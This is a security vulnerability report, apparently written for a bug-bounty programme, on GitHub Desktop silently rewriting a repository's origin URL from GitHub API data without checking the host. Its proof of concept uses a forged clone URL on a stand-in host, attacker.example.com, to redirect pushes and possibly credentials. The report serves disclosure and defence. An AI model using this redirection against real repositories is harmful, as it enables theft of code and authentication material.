### Title
Silent, Unconfirmed Remote-URL Rewrite from GitHub API Data Enables Push/Credential Redirection - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl()` automatically calls `git remote set-url` on a repository's default remote whenever the cached `GitHubRepository.cloneURL` differs from the `clone_url` field of a freshly-fetched `IAPIFullRepository` object, with no user confirmation, no host allow-list check against the account's known endpoint, and no re-validation that the new URL still points at a repository the user actually intended to work with.

### Finding Description
`updateRemoteUrl` in `app/src/lib/stores/updates/update-remote-url.ts:7-45` reads `apiRepo.clone_url` (data returned from the GitHub/GHES API) and, if the *current* remote still matches the previously cached clone URL (`remoteUrlUnchanged`) and its scheme matches (`protocolsMatch`), rewrites the origin remote directly: [1](#0-0) 

Critically, the only check performed on the *new* URL is that its scheme (`http:`/`https:`/etc.) matches the old one — there is no check that its hostname matches the user's configured GitHub/GHES endpoint, and no re-derivation/verification of owner+name+host the way `urlMatchesRemote` is used for the *old* value comparison: [2](#0-1) 

The rewrite itself is applied unconditionally through `GitStore.setRemoteURL`, which shells out to `git remote set-url` with no dialog, warning, or opt-out: [3](#0-2) [4](#0-3) 

Because the trigger for the rewrite is simply "the API's reported `clone_url` differs from what Desktop last cached," any source that can influence that API object — a malicious/compromised GitHub Enterprise Server the user has added as an account endpoint, or a network path capable of tampering with API responses to such an endpoint — can hand Desktop an arbitrary `clone_url` (same scheme, different host/owner/repo) and have Desktop silently repoint the user's `origin` remote at it. This is the same broken-invariant shape as the report's seed: a security-relevant configuration value (here, "which remote a repository's commits are pushed to") that users implicitly rely on being stable is rewritten by the tool itself outside of any explicit user action, based on external/attacker-influenced input, with no consent step and no way to detect it happened until after the fact.

### Impact Explanation
Once `origin` is silently repointed:
- The next `git push` from Desktop sends the user's commits (and, depending on credential-helper behavior for the new host, potentially credentials/tokens used during the HTTPS auth handshake) to the attacker-controlled remote instead of the intended one — matching "silent corruption of what the user commits or pushes" and "credential/token exfiltration" from the accepted impact list.
- Subsequent fetches/pulls could then pull attacker-supplied history into the user's local repository, which the user may then unknowingly build on and push elsewhere.
- There is no UI signal comparable to the explicit "Remote URL" field in Repository Settings (`app/src/ui/repository-settings/remote.tsx`) that would alert the user the value changed underneath them.

### Likelihood Explanation
This requires the attacker to control (or MITM) a GitHub API-compatible endpoint the user has added an account for — realistic for GHES instances pointed at by self-hosted/enterprise users, or via a compromising proxy sitting in front of such an endpoint, which matches the accepted "git remote/proxy response" and "GitHub API object" attacker classes in scope (no local/physical access, no leaked credentials, and no unnatural user steps are required — the update path runs as part of Desktop's normal background repository refresh flow that consumes `IAPIFullRepository` data). The only gating conditions (`protocolsMatch`, `remoteUrlUnchanged`, `!urlsMatch`) are all satisfiable by an attacker who fully controls the API response.

### Recommendation
- Require the new `clone_url` to resolve to the same host as the account's configured API endpoint (or an explicit allow-list) before auto-rewriting the remote.
- Surface an explicit, dismissible confirmation to the user before changing `origin`'s URL as a side effect of a background metadata refresh, rather than applying it silently via `gitStore.setRemoteURL`.
- Log/emit a non-fatal notice (similar to the existing `remoteNameMismatch` telemetry in `app-store.ts`) whenever an automatic remote-URL rewrite occurs, so users and telemetry can detect unexpected changes.

### Proof of Concept
1. User adds a GitHub Enterprise Server account in Desktop and clones a repository from it; Desktop caches `GitHubRepository.cloneURL` = `https://ghes.company.com/team/repo.git` and sets `origin` to the same URL.
2. The GHES instance is compromised, or an on-path proxy intercepts a repository-metadata API call and returns an `IAPIFullRepository` object identical to the real one except `clone_url` = `https://attacker.example.com/team/repo.git`.
3. On the next background refresh, `updateRemoteUrl` is invoked with this API object: `protocolsMatch` is true (`https` == `https`), `remoteUrlUnchanged` is true (current `origin` still equals the previously cached legit clone URL), and `!urlsMatch` is true (new host differs) — the branch fires and `gitStore.setRemoteURL('origin', 'https://attacker.example.com/team/repo.git')` executes with no user prompt: [5](#0-4) .
4. The user's next push (initiated normally through Desktop's UI, unaware `origin` changed) sends their commits and, depending on the credential helper, authentication material to `attacker.example.com`.

### Citations

**File:** app/src/lib/stores/updates/update-remote-url.ts (L36-44)
```typescript
  // Check if the default remote url has been manually changed from the
  // clone url retrieved from the GitHub API previously
  const remoteUrlUnchanged =
    gitStore.defaultRemote &&
    urlMatchesRemote(gitHubRepository.cloneURL, gitStore.defaultRemote)

  if (protocolsMatch && remoteUrlUnchanged && !urlsMatch) {
    await gitStore.setRemoteURL(gitStore.defaultRemote.name, updatedRemoteUrl)
  }
```

**File:** app/src/lib/repository-matching.ts (L90-117)
```typescript
export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
```

**File:** app/src/lib/stores/git-store.ts (L1533-1543)
```typescript
  /** Changes the URL for the remote that matches the given name  */
  public async setRemoteURL(name: string, url: string): Promise<boolean> {
    const wasSuccessful =
      (await this.performFailableOperation(() =>
        setRemoteURL(this.repository, name, url)
      )) === true
    await this.loadRemotes()

    this.emitUpdate()
    return wasSuccessful
  }
```

**File:** app/src/lib/git/remote.ts (L56-64)
```typescript
/** Changes the URL for the remote that matches the given name  */
export async function setRemoteURL(
  repository: Repository,
  name: string,
  url: string
): Promise<true> {
  await git(['remote', 'set-url', name, url], repository.path, 'setRemoteURL')
  return true
}
```
